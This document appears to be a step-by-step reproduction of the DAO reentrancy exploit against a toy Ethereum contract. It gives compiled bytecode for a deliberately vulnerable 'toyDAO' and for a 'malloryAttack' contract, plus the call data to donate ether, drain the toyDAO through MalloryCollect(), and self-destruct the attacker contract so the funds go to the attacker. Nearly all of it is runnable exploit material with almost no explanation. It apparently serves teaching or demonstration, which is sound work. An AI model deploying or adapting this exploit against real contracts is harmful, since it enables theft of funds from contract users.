Refer to the DAO code
//http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/
//https://github.com/gaobo89/DAO-1.0

1. creator address deploy toyDAO contract.

creator address:
0x8a3c3b1535AA88Dd6698c6bb0A11A3be35b179a9

deployed data:
0x6060604052361561003b5763ffffffff60e060020a6000350416634162169f811461009257806341c0e1b5146100c1578063f4f898b7146100d6575b5b600054600160a060020a0316633ccfd60b6040518163ffffffff1660e060020a028152600401600060405180830381600087803b151561007b57600080fd5b6102c65a03f1151561008c57600080fd5b5050505b005b341561009d57600080fd5b6100a56100e0565b604051600160a060020a03909116815260200160405180910390f35b34156100cc57600080fd5b6100906100ef565b005b6100906100fd565b005b600054600160a060020a031681565b33600160a060020a0316ff5b565b60008054600160a060020a03169063ed88c68e903490604051602001526040518263ffffffff1660e060020a0281526004016020604051808303818588803b151561014757600080fd5b6125ee5a03f1151561015857600080fd5b5050505060405180515050600054600160a060020a0316633ccfd60b6040518163ffffffff1660e060020a028152600401600060405180830381600087803b15156101a257600080fd5b6102c65a03f115156101b357600080fd5b5050505b5600a165627a7a72305820f2e9d7a7d50e2b583a80733f1d3565d9a7d3123df2d5ae181fd13f1f5e1d38580029
send data:
0x606060405260008054600160a060020a031916738a0a8d81192264b0e436b57d30f472a6468780ef179055341561003557600080fd5b5b60018054600160a060020a03191633600160a060020a03161790555b5b6101e5806100626000396000f3006060604052361561003b5763ffffffff60e060020a6000350416634162169f811461009257806341c0e1b5146100c1578063f4f898b7146100d6575b5b600054600160a060020a0316633ccfd60b6040518163ffffffff1660e060020a028152600401600060405180830381600087803b151561007b57600080fd5b6102c65a03f1151561008c57600080fd5b5050505b005b341561009d57600080fd5b6100a56100e0565b604051600160a060020a03909116815260200160405180910390f35b34156100cc57600080fd5b6100906100ef565b005b6100906100fd565b005b600054600160a060020a031681565b33600160a060020a0316ff5b565b60008054600160a060020a03169063ed88c68e903490604051602001526040518263ffffffff1660e060020a0281526004016020604051808303818588803b151561014757600080fd5b6125ee5a03f1151561015857600080fd5b5050505060405180515050600054600160a060020a0316633ccfd60b6040518163ffffffff1660e060020a028152600401600060405180830381600087803b15156101a257600080fd5b6102c65a03f115156101b357600080fd5b5050505b5600a165627a7a72305820f2e9d7a7d50e2b583a80733f1d3565d9a7d3123df2d5ae181fd13f1f5e1d38580029


2. copy toyDAO contract address to the malloryAttack, account2 address deploy malloryAttack contract.

account2 address:
0x901Cb40e19debe219e2c5b00297B8501Cc18f44d

deployed data:
0x6060604052361561003b5763ffffffff60e060020a6000350416634162169f81146100a857806341c0e1b5146100d7578063f4f898b7146100ec575b5b60005434600160a060020a0390911631106100a557600054600160a060020a0316633ccfd60b6040518163ffffffff1660e060020a028152600401600060405180830381600087803b151561009057600080fd5b6102c65a03f115156100a157600080fd5b5050505b5b005b34156100b357600080fd5b6100bb6100f6565b604051600160a060020a03909116815260200160405180910390f35b34156100e257600080fd5b6100a5610105565b005b6100a5610115565b005b600054600160a060020a031681565b600154600160a060020a0316ff5b565b60008054600160a060020a03169063ed88c68e903490604051602001526040518263ffffffff1660e060020a0281526004016020604051808303818588803b151561015f57600080fd5b6125ee5a03f1151561017057600080fd5b5050505060405180515050600054600160a060020a0316633ccfd60b6040518163ffffffff1660e060020a028152600401600060405180830381600087803b15156101ba57600080fd5b6102c65a03f115156101cb57600080fd5b5050505b5600a165627a7a72305820093dd17b4479c282dcd79be5f20741fa07d30f6c6e57e091b5f09c8d2e20e0900029
send data:
0x606060405260008054600160a060020a031916738a0a8d81192264b0e436b57d30f472a6468780ef179055341561003557600080fd5b5b60018054600160a060020a03191633600160a060020a03161790555b5b6101fd806100626000396000f3006060604052361561003b5763ffffffff60e060020a6000350416634162169f81146100a857806341c0e1b5146100d7578063f4f898b7146100ec575b5b60005434600160a060020a0390911631106100a557600054600160a060020a0316633ccfd60b6040518163ffffffff1660e060020a028152600401600060405180830381600087803b151561009057600080fd5b6102c65a03f115156100a157600080fd5b5050505b5b005b34156100b357600080fd5b6100bb6100f6565b604051600160a060020a03909116815260200160405180910390f35b34156100e257600080fd5b6100a5610105565b005b6100a5610115565b005b600054600160a060020a031681565b600154600160a060020a0316ff5b565b60008054600160a060020a03169063ed88c68e903490604051602001526040518263ffffffff1660e060020a0281526004016020604051808303818588803b151561015f57600080fd5b6125ee5a03f1151561017057600080fd5b5050505060405180515050600054600160a060020a0316633ccfd60b6040518163ffffffff1660e060020a028152600401600060405180830381600087803b15156101ba57600080fd5b6102c65a03f115156101cb57600080fd5b5050505b5600a165627a7a72305820093dd17b4479c282dcd79be5f20741fa07d30f6c6e57e091b5f09c8d2e20e0900029


3. creator address call donate() function of toyDAO to donate ether to toyDAO contract.

send data:
0xed88c68e


4. account2 address call MalloryCollect() function of malloryAttack to collect all the ether in toyDAO contract.

send data:
0xf4f898b7

5. kill the malloryAttack contract to get the money to the attacker address.
